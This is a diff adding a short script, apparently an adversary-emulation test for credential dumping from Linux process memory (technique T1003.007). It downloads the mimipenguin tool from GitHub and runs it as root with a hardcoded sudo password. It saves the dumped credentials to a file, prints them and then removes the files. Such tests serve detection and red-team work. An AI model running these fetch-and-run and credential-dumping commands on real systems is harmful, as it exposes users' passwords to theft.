@@ -1,0 +1,12 @@
+;
+#pre
+wget -O "/tmp/mimipenguin.tar.gz" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz
+mkdir /tmp/mimipenguin
+tar -xzvf "/tmp/mimipenguin.tar.gz" -C /tmp/mimipenguin
+#command
+echo "010404" | sudo -S /tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh > /tmp/T1003.007Test3.txt
+#check
+cat /tmp/T1003.007Test3.txt
+#cleanup
+rm -f /tmp/T1003.007Test3.txt /tmp/mimipenguin.tar.gz
+rm -rf /tmp/mimipenguin
